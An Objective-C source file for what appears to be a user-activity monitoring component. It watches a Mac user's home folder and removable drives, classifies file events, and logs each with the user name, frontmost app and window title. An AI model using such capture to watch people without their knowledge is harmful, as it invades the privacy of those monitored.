//
//  FileActivityNotify.m
//  FileActivityCaptureManager
//
//  Create by ophat on 9/22/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "FileActivityNotify.h"

#import "SystemUtilsImpl.h"

#import "DateTimeFormat.h"
#import "FxFileActivityEvent.h"

@implementation FileActivityNotify
@synthesize mWatchlist,mExcludePath,mAction,mHistory;
@synthesize mCurrentUserName;
@synthesize mStream, mCurrentRunloopRef;
@synthesize mDelegate , mSelector ;

id _mFileActivityNotify;

#pragma mark ### Init
-(id)init{
    if ((self = [super init])) {
        _mFileActivityNotify = self;
        [self saveCurrentUser];
        self.mHistory = [[NSMutableArray alloc]init];
        self.mExcludePath = [[[NSArray alloc]init] autorelease];
        self.mAction = [[[NSArray alloc]init] autorelease];
        self.mWatchlist = [[NSMutableArray alloc] init];
    }
    return self;
}


#pragma mark ### saveCurrentUser

-(void) saveCurrentUser {
    self.mCurrentUserName =  [SystemUtilsImpl userLogonName];
}

#pragma mark ### start/stop

-(void) startCapture{
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(externalMount:)  name:NSWorkspaceDidMountNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(externalUnMount:)  name:NSWorkspaceDidUnmountNotification  object:nil];
    [self restartCapture];
}

-(void) stopCapture{
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidMountNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidUnmountNotification object:nil];
    [self stopWatcher];
}

-(void) startWatcher{
    DLog(@"startWatcher");
    [self watchThisPath:self.mWatchlist];
}

-(void) stopWatcher{
    if (mStream != nil) {
        
        DLog(@"stopWatcher");
        
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

-(void)restartCapture {
    [self clearPathFromWatcher];
    [self addPathToWatcher];
    
    [self stopWatcher];
    [self startWatcher];
}
#pragma mark ### Mount/UnMount

-(void) externalMount:(NSNotification *) aNot{
    [self restartCapture];
}
-(void) externalUnMount:(NSNotification *) aNot{
    [self restartCapture];
}

#pragma mark ### watcher

-(void) watchThisPath:(NSArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
    
    if([afileInputPath count]>0){
        DLog(@"afileInputPath %@",afileInputPath);
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileChangeEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        1.5,
                                        kFSEventStreamCreateFlagWatchRoot  |
                                        kFSEventStreamCreateFlagUseCFTypes |
                                        kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
    }
}

#pragma mark ### fileChangeEvent

static void fileChangeEvent(ConstFSEventStreamRef streamRef,
                     void* callBackInfo,
                     size_t numEvents,
                     void* eventPaths,
                     const FSEventStreamEventFlags eventFlags[],
                     const FSEventStreamEventId eventIds[]) {

   
    NSArray * paths = [[NSArray alloc]initWithArray:(__bridge NSArray*)eventPaths];

    NSMutableArray * listOfEvent = [[NSMutableArray alloc]init];
    
    for (int i=0; i< [paths count] ; i++ ){ 
        FSEventStreamEventFlags flags = eventFlags[i];
        NSString * filePath = [paths objectAtIndex:i];

        if ([filePath rangeOfString:@".DS_Store"].location == NSNotFound) {
            
            if ([filePath rangeOfString:@"/."].location == NSNotFound) {
                NSString * event = [[NSString alloc]initWithString:[_mFileActivityNotify checkfile:filePath flag:flags ]];
                if ([event length]>0) {
                    [listOfEvent addObject:event];
                }
                [event release];
            }else{
                if ([filePath rangeOfString:@"/.Trash"].location != NSNotFound) {
                    NSString * event = [[NSString alloc]initWithString:[_mFileActivityNotify checkfile:filePath flag:flags ]];
                    if ([event length]>0) {
                        [listOfEvent addObject:event];
                    }
                    [event release];
                }
            }
        }
    }
    if ([listOfEvent count]>0) {
        [_mFileActivityNotify identifyEvent:listOfEvent ];
    }
    
    [listOfEvent release];
}

-(NSString *) checkfile:(NSString *)path flag:(FSEventStreamEventFlags) flags {

    NSFileManager * file = [NSFileManager defaultManager];

    NSString * sym = @"";
    if (flags & kFSEventStreamEventFlagItemCreated) {
        sym = @"CREATE";
    }if (flags & kFSEventStreamEventFlagItemRenamed) {
        if ([sym length]>0) {
            sym = [NSString stringWithFormat:@"%@,RENAME" ,sym];
        }else{
            sym = @"RENAME";
        }
    }if (flags & kFSEventStreamEventFlagItemModified) {
        if ([sym length]>0) {
            sym = [NSString stringWithFormat:@"%@,MODIFY" ,sym];
        }else{
            sym = @"MODIFY";
        }
    }if (flags & kFSEventStreamEventFlagItemRemoved) {
        if ([sym length]>0) {
            sym = [NSString stringWithFormat:@"%@,DELETE" ,sym];
        }else{
            sym = @"DELETE";
        }
    }if (flags & kFSEventStreamEventFlagItemChangeOwner) {
        if ([sym length]>0) {
            sym = [NSString stringWithFormat:@"%@,CHANGEPERMISSION" ,sym];
        }else{
            sym = @"CHANGEPERMISSION";
        }
    }if (flags & kFSEventStreamEventFlagItemInodeMetaMod) {
        if ([sym length]>0) {
            //Do Nothing
        }else{
            sym = @"METAMODIFY";
        }
    }if (flags & kFSEventStreamEventFlagItemXattrMod) {
        if ([sym length]>0) {
           //Do Nothing
        }else{
            sym = @"ATTRMODIFY";
        }
    }

    NSDictionary *attrs = [file attributesOfItemAtPath: path error: NULL];
    unsigned long long filesize = [attrs fileSize];
    NSString * returner = @"";
    returner = [NSString stringWithFormat:@"%@::%@::%llu",sym,path,filesize];
    return returner;
}

-(void)identifyEvent:(NSMutableArray *)aEventLists{
    DLog(@"identifyEvent /n %@",aEventLists);
    BOOL sizeIsZero = false;
    NSString * pathkeeper = @"";
    
    for (int i=0; i < [aEventLists count]; i++) {
        NSString * content =[[NSString alloc]initWithString:[aEventLists objectAtIndex:i]];
        NSArray * spliter = [content componentsSeparatedByString:@"::"];
        int operation = -1;
        
        if ( [[spliter objectAtIndex:0]rangeOfString:@"CREATE"].location != NSNotFound && [[spliter objectAtIndex:0]rangeOfString:@"MODIFY"].location != NSNotFound
            &&   [[spliter objectAtIndex:0]rangeOfString:@"CHANGEPERMISSION"].location == NSNotFound ){
            operation = kFileActivityTypeCreate;
        }
        
        if ( [[spliter objectAtIndex:0]isEqualToString:@"CREATE"] && ! [[spliter objectAtIndex:2]isEqualToString:@"0"]){
            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath: [spliter objectAtIndex:1] error: NULL];
            if ([[spliter objectAtIndex:2] intValue] == [[attrs objectForKey:@"NSFileSize"] intValue] ) {
                operation = kFileActivityTypeCreate;
            }
        }
        
        if ( [[spliter objectAtIndex:0]rangeOfString:@"CREATE"].location != NSNotFound && [[spliter objectAtIndex:0]rangeOfString:@"RENAME"].location != NSNotFound
        &&  ! [[spliter objectAtIndex:2]isEqualToString:@"0"]){
            operation = kFileActivityTypeCreate;
        }
        
        if ( [[spliter objectAtIndex:0]isEqualToString:@"RENAME"] && ! [[spliter objectAtIndex:2]isEqualToString:@"0"] && !sizeIsZero ){
            
            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath: [spliter objectAtIndex:1] error: NULL];
            int diffTime = [[NSDate date] timeIntervalSince1970] - [[attrs objectForKey:@"NSFileCreationDate"]timeIntervalSince1970];
            if (diffTime < 2) {
                operation = kFileActivityTypeCreate;
            }else{
                diffTime = [[NSDate date] timeIntervalSince1970] - [[attrs objectForKey:@"NSFileModificationDate"]timeIntervalSince1970];
                if (diffTime < 2) {
                    operation = kFileActivityTypeModify;
                }
            }
        }
  
        if (sizeIsZero) {
            if (![pathkeeper isEqualToString:[self getOnlyPath:[spliter objectAtIndex:1]]] ) {
                operation = kFileActivityTypeMove;
            }else{
                operation = kFileActivityTypeRename;
            }
            sizeIsZero = false;
            pathkeeper = @"";
        }
        if ( [[spliter objectAtIndex:0]rangeOfString:@"RENAME"].location != NSNotFound && [[spliter objectAtIndex:2]isEqualToString:@"0"] ) {
            pathkeeper = [self getOnlyPath:[spliter objectAtIndex:1]];
            sizeIsZero = true;
        }
 
        if ( [[spliter objectAtIndex:0]rangeOfString:@"CREATE"].location != NSNotFound && [[spliter objectAtIndex:0]rangeOfString:@"MODIFY"].location != NSNotFound
        &&   [[spliter objectAtIndex:0]rangeOfString:@"CHANGEPERMISSION"].location != NSNotFound
        ){
            operation = kFileActivityTypeCopy;
        }

        if ( [[spliter objectAtIndex:0]isEqualToString:@"MODIFY"]){
            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath: [spliter objectAtIndex:1] error: NULL];
            int diffTime = [[NSDate date] timeIntervalSince1970] - [[attrs objectForKey:@"NSFileCreationDate"]timeIntervalSince1970];
            if (diffTime < 2) {
                operation = kFileActivityTypeCreate;
            }else{
                diffTime = [[NSDate date] timeIntervalSince1970] - [[attrs objectForKey:@"NSFileModificationDate"]timeIntervalSince1970];
                if (diffTime < 2) {
                    operation = kFileActivityTypeModify;
                }
            }
        }
        
        if ( [[spliter objectAtIndex:0]isEqualToString:@"DELETE"]){
            operation = kFileActivityTypeDelete;
        }

        if ( [[spliter objectAtIndex:0]isEqualToString:@"CHANGEPERMISSION"]){
            operation = kFileActivityTypePermissionChange;
        }
        
        if ( [[spliter objectAtIndex:0]isEqualToString:@"ATTRMODIFY"]){
            operation = kFileActivityTypeAttrubuteChange;
        }
        
        if ( [[spliter objectAtIndex:0]isEqualToString:@"METAMODIFY"]){
            operation = kFileActivityTypeAttrubuteChange;
        }
        
        if (operation != -1) {
            
            Boolean isInExculde = false;
            for (int i=0; i < [self.mExcludePath count]; i++) {
                if ([[self.mExcludePath objectAtIndex:i]rangeOfString:@":/"].location != NSNotFound) {
                    if ([[spliter objectAtIndex:1] rangeOfString:@"/Volumes"].location != NSNotFound) {
                        NSArray * allMount = [self findCurrentLocalVolumn];
                        for (int i = 0; i < [allMount count]; i++) {
                            NSString * path = [[self.mExcludePath objectAtIndex:i] stringByReplacingOccurrencesOfString:@":" withString:@""];
                            path = [NSString stringWithFormat:@"%@%@",[allMount objectAtIndex:i],path];
                            if ([[spliter objectAtIndex:1] rangeOfString:path].location != NSNotFound) {
                                isInExculde = true;
                            }
                        }
                    }
                }else{
                    NSString * path = [NSString stringWithFormat:@"/Users/%@%@",self.mCurrentUserName,[self.mExcludePath objectAtIndex:i] ];
                    if ([[spliter objectAtIndex:1] rangeOfString:path].location != NSNotFound) {
                        isInExculde = true;
                    }
                }
            }
            
            DLog(@"isInExculde %d",isInExculde);
            if (!isInExculde) {
                if ([self.mAction containsObject:[NSNumber numberWithInt:operation]]) {
                    NSString * frontMostName = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationName]];
                    NSString * frontMostID = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationID]];
                    NSString * frontMostTitle = [[NSString alloc]initWithString:[SystemUtilsImpl frontApplicationWindowTitle]];
                    
                    if (operation == kFileActivityTypeMove || operation == kFileActivityTypeRename ) {
                        NSString * oldPath =[[[aEventLists objectAtIndex:(i-1)] componentsSeparatedByString:@"::"] objectAtIndex:1];
                        [self readyToSend:operation OldPath:oldPath Path: [spliter objectAtIndex:1] Size:[spliter objectAtIndex:2] Appname:frontMostName AppID:frontMostID Title:frontMostTitle];
                    }else{
                        [self readyToSend:operation OldPath:@"" Path: [spliter objectAtIndex:1] Size:[spliter objectAtIndex:2] Appname:frontMostName AppID:frontMostID Title:frontMostTitle];
                    }
                    [frontMostTitle release];
                    [frontMostName release];
                    [frontMostID release];
                }else{
                    DLog(@"Not For This Action ID %d",operation);
                }
            }
        }
        [content release];
    }
}
#pragma mark ### Send

-(void)readyToSend:(int )aOperation OldPath:(NSString *)aOldPath Path:(NSString *)aPath Size:(NSString *)aSize Appname:(NSString *)aAppName AppID:(NSString *)aAppID Title:(NSString *)aTitle {

    if ([mDelegate respondsToSelector:mSelector] ){

        NSFileManager * fm = [NSFileManager defaultManager];
        NSDictionary *attrs = [fm attributesOfItemAtPath: aPath error: nil];
        
        int fileSize = 0;
        BOOL isDir = false;
        
        if ([fm fileExistsAtPath:aPath isDirectory:&isDir]) {
            if (isDir) {
                NSArray *childFiles = [[NSArray alloc]initWithArray:[fm contentsOfDirectoryAtPath:aPath error:nil]];
                for (int i=0 ; i < [childFiles count];i++) {
                    if (![[childFiles objectAtIndex:i]isEqualToString:@".DS_Store"]) {
                        [self readyToSend:aOperation OldPath:[NSString stringWithFormat:@"%@/%@",aOldPath,[childFiles objectAtIndex:i]] Path:[NSString stringWithFormat:@"%@/%@",aPath,[childFiles objectAtIndex:i]] Size:nil Appname:aAppName AppID:aAppID Title:aTitle];
                    }
                }
                [childFiles release];
            }else{
                fileSize = [[attrs objectForKey:@"NSFileSize"] intValue];
            }
        }
        
        if ((attrs != nil || aOperation == kFileActivityTypeDelete) && !isDir) {
            
            NSString * saveHistory = [NSString stringWithFormat:@"%@|%@|%@|%@|%@|%@|%d|%d|%@|%@|%@|%@|%d|%@",aOldPath,aPath,self.mCurrentUserName,aAppName,aAppID,aTitle,aOperation,[self getFileType:[attrs objectForKey:@"NSFileType"]],[attrs objectForKey:@"NSFileOwnerAccountName"],[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileCreationDate"]],[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]],[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]],[[attrs objectForKey:@"NSFilePosixPermissions"] intValue],[DateTimeFormat phoenixDateTime]];
                                      
            if (! [self.mHistory containsObject:saveHistory]) {
            
                NSMutableArray * Permission = [[NSMutableArray alloc]init];
                FxFileActivityInfo * FileOriginalInfo = [[FxFileActivityInfo alloc]init];
                FxFileActivityInfo * FileUpdateInfo = [[FxFileActivityInfo alloc]init];

                if (aOperation == kFileActivityTypeMove || aOperation == kFileActivityTypeRename ) {
                    if ([aOldPath length] >0) {
                        [FileOriginalInfo setMPath:aOldPath];
                        [FileOriginalInfo setMFileName:[self getOnlyFile:aOldPath]];
                        [FileOriginalInfo setMSize:0];
                        [FileOriginalInfo setMAttributes:0];
                        [FileOriginalInfo setMPermissions:Permission];
                    }else{
                        FileOriginalInfo = nil;
                    }
                  
                    [Permission removeAllObjects];
                    
                    [FileUpdateInfo setMPath:aPath];
                    [FileUpdateInfo setMFileName:[self getOnlyFile:aPath]];
                    [FileUpdateInfo setMSize:fileSize];
                    [FileUpdateInfo setMAttributes:0];
                    NSString * symbolicPermission = [self symbolicPermissionFromInteger:[[attrs objectForKey:@"NSFilePosixPermissions"] intValue]];
                    Permission = [[self permissionFromSymbolic:symbolicPermission] mutableCopy];
                    [FileUpdateInfo setMPermissions:Permission];
                    

                }else if (aOperation == kFileActivityTypeCreate  || aOperation == kFileActivityTypeDelete) {
                    FileOriginalInfo = nil;
                    
                    [Permission removeAllObjects];
                    [FileUpdateInfo setMPath:aPath];
                    [FileUpdateInfo setMFileName:[self getOnlyFile:aPath]];
                    [FileUpdateInfo setMSize:fileSize];
                    [FileUpdateInfo setMAttributes:0];
                    NSString * symbolicPermission = [self symbolicPermissionFromInteger:[[attrs objectForKey:@"NSFilePosixPermissions"] intValue]];
                    Permission = [[self permissionFromSymbolic:symbolicPermission] mutableCopy];
                    [FileUpdateInfo setMPermissions:Permission];
                    
                }else{
                    
                    FileOriginalInfo = nil;
                    
                    [Permission removeAllObjects];
                    [FileUpdateInfo setMPath:aPath];
                    [FileUpdateInfo setMFileName:[self getOnlyFile:aPath]];
                    [FileUpdateInfo setMSize:fileSize];
                    [FileUpdateInfo setMAttributes:0];
                    NSString * symbolicPermission = [self symbolicPermissionFromInteger:[[attrs objectForKey:@"NSFilePosixPermissions"] intValue]];
                    Permission = [[self permissionFromSymbolic:symbolicPermission] mutableCopy];
                    [FileUpdateInfo setMPermissions:Permission];
                }
                
                DLog(@"##========= FileActivity ReadyToSend");
                DLog(@"OldPath %@",aOldPath);
                DLog(@"ModifyPath %@",aPath);
                DLog(@"FileSize %d",fileSize);
                DLog(@"USER_LOGON_NAME %@",self.mCurrentUserName);
                DLog(@"APPLICATION_ID %@",aAppName);
                DLog(@"APPLICATION_NAME %@",aAppID);
                DLog(@"TITLE %@",aTitle);
                DLog(@"ACTIVITY_TYPE %d",aOperation);
                DLog(@"FILE_TYPE %d",[self getFileType:[attrs objectForKey:@"NSFileType"]]);
                
                DLog(@"ACTIVITY_OWNER %@",[attrs objectForKey:@"NSFileOwnerAccountName"]);
                DLog(@"DATE_CREATE %@",  [DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileCreationDate"]] );
                DLog(@"DATE_MODIFIED %@",[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]] );
                DLog(@"DATE_ACCESSED %@",[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]] );
                
                DLog(@"ORI_FILE_INFO %@",FileOriginalInfo);
                DLog(@"UPDATED_FILE_INFO %@",FileUpdateInfo);
                DLog(@"####################################");
                
                FxFileActivityEvent * fileActivityEvent = [[FxFileActivityEvent alloc] init];
                [fileActivityEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [fileActivityEvent setMUserLogonName:self.mCurrentUserName];
                [fileActivityEvent setMApplicationName:aAppName];
                [fileActivityEvent setMApplicationID:aAppID];
                [fileActivityEvent setMTitle:aTitle];
                [fileActivityEvent setMActivityType:aOperation];
                [fileActivityEvent setMActivityFileType:[self getFileType:[attrs objectForKey:@"NSFileType"]]];
                [fileActivityEvent setMActivityOwner:[NSString stringWithFormat:@"%@",[attrs objectForKey:@"NSFileOwnerAccountName"]]];
                [fileActivityEvent setMDateCreated:[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileCreationDate"]]];
                [fileActivityEvent setMDateModified:[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]]];
                [fileActivityEvent setMDateAccessed:[DateTimeFormat phoenixDateTime:[attrs objectForKey:@"NSFileModificationDate"]]];
                if (attrs == nil && aOperation == kFileActivityTypeDelete) {
                    [fileActivityEvent setMActivityOwner:@""];
                    [fileActivityEvent setMDateCreated:@"1970-01-01 00:00:00"];
                    [fileActivityEvent setMDateModified:@"1970-01-01 00:00:00"];
                    [fileActivityEvent setMDateAccessed:@"1970-01-01 00:00:00"];
                }
                [fileActivityEvent setMOriginalFile:FileOriginalInfo];
                [fileActivityEvent setMModifiedFile:FileUpdateInfo];

                [mDelegate performSelector:mSelector withObject:fileActivityEvent];
                [fileActivityEvent release];
                
                [Permission release];
                [FileUpdateInfo release];
                [FileOriginalInfo release];
                
                [self.mHistory addObject:saveHistory];
            }else{
                DLog(@"##### Duplicate System CALL");
            }
        }else{
            DLog(@"No Send Because IS DIR");
        }
    }else{
        DLog(@"No!!!");
    }
}
#pragma mark ### Ultility

-(void) clearPathFromWatcher{
    [self.mWatchlist removeAllObjects];
}

-(void) addPathToWatcher {
    NSString * path  = [[NSString alloc]initWithString:[NSString stringWithFormat:@"/Users/%@",self.mCurrentUserName]];
    [self.mWatchlist addObject:path];
    [path release];

    NSArray * vol = [[NSArray alloc]initWithArray:[self findCurrentLocalVolumn]];
    for (int i=0 ; i < [vol count]; i++) {
        [self.mWatchlist addObject:[vol objectAtIndex:i]];
    }
    [vol release];
}

-(NSArray *) findCurrentLocalVolumn {
    NSWorkspace   *ws = [NSWorkspace sharedWorkspace];
    return [ws mountedRemovableMedia];
}

-(int) getFileType:(NSString *)aType{
    int type = kFileActivityFileTypeUnknown;
    if ([aType isEqualToString:@"NSFileTypeDirectory"]) {
        type = kFileActivityFileTypeDirectory;
    }else if ([aType isEqualToString:@"NSFileTypeRegular"]) {
        type = kFileActivityFileTypeRegular;
    }else if ([aType isEqualToString:@"NSFileTypeSymbolicLink"]) {
        type = kFileActivityFileTypeSymbolicLink;
    }else if ([aType isEqualToString:@"NSFileTypeSocket"]) {
        type = kFileActivityFileTypeSocket;
    }else if ([aType isEqualToString:@"NSFileTypeBlockSpecial"]) {
        type = kFileActivityFileTypeBlock;
    }else if ([aType isEqualToString:@"NSFileTypeCharacterSpecial"]) {
        type = kFileActivityFileTypeCharacterDevice;
    }
    return type;
}

-(NSString *)getOnlyPath:(NSString *)aPath{
    NSString * fullPath = @"";
    NSRange range = [aPath rangeOfString:@"/" options:NSBackwardsSearch];
    if (range.location != NSNotFound) {
        NSRange fullRange = NSMakeRange(0, (range.location));
        fullPath = [aPath substringWithRange:fullRange];
        fullPath = [fullPath stringByReplacingOccurrencesOfString:@".download" withString:@""];
        return fullPath;
    }
    return @"";
}

-(NSString *)getOnlyFile:(NSString *)aPath{
    NSString * file = @"";
    NSRange range = [aPath rangeOfString:@"/" options:NSBackwardsSearch];
    if (range.location != NSNotFound) {
        NSRange fullRange = NSMakeRange( (range.location + 1), ( [aPath length] - range.location ) -1 );
        file = [aPath substringWithRange:fullRange];
        return file;
    }
    return @"";
}

- (NSString *)symbolicPermissionFromInteger:(int) p {
    char s[12];
    strmode(p, s);
    NSString * Permission = [[NSString stringWithUTF8String: s] stringByReplacingOccurrencesOfString:@"?" withString:@""];
    Permission = [Permission stringByReplacingOccurrencesOfString:@" " withString:@""];
    return Permission;
}

-(NSMutableArray *) permissionFromSymbolic:(NSString *)aSymbolic{
    NSMutableArray * Permissions = [[NSMutableArray alloc]init];
    FxFileActivityPermission * filePer = nil;
    for (int i=0; i < [aSymbolic length]; i++) {
        NSString * character = [[NSString alloc]initWithString:[NSString stringWithFormat:@"%c",[aSymbolic characterAtIndex:i]]];
        if (i % 3 == 0 || i == 0) {
            if (filePer) {
                [Permissions addObject:filePer];
                [filePer release];
                filePer = nil;
            }

            filePer = [[FxFileActivityPermission alloc]init];
            
            if (i==0) {
                [filePer setMGroupUserName:@"OWNER"];
            }else if (i==3) {
                [filePer setMGroupUserName:@"GROUP"];
            }else if (i==6) {
                [filePer setMGroupUserName:@"OTHER"];
            }
            [filePer setMPrivilegeFullControl:kActivityPrivilegeNone];
            [filePer setMPrivilegeModify:kActivityPrivilegeNone];
            [filePer setMPrivilegeReadExecute:kActivityPrivilegeDeny];
            [filePer setMPrivilegeRead:kActivityPrivilegeDeny];
            [filePer setMPrivilegeWrite:kActivityPrivilegeDeny];
            [filePer setMPrivilegeListFolderContents:kActivityPrivilegeNone];
            
            if ([character isEqualToString:@"r"]) {
                [filePer setMPrivilegeRead:kActivityPrivilegeAllow];
            }
        }else{
            if ([character isEqualToString:@"w"] ) {
                [filePer setMPrivilegeWrite:kActivityPrivilegeAllow];
            }else if ([character isEqualToString:@"x"]){
                [filePer setMPrivilegeReadExecute:kActivityPrivilegeAllow];
            }
        }
        [character release];
    }
    
    [Permissions addObject:filePer ];
    [filePer release];
    filePer = nil;
    return [Permissions autorelease];
    
}
#pragma mark ### destroy

-(void)dealloc {
    [self stopCapture];
    
    mStream = nil;
    mCurrentRunloopRef = nil;
    [_mFileActivityNotify release];
    [mCurrentUserName release];
    [mHistory release];
    [mWatchlist release];
    [mExcludePath release];
    [mAction release];
    [super dealloc];
}

@end
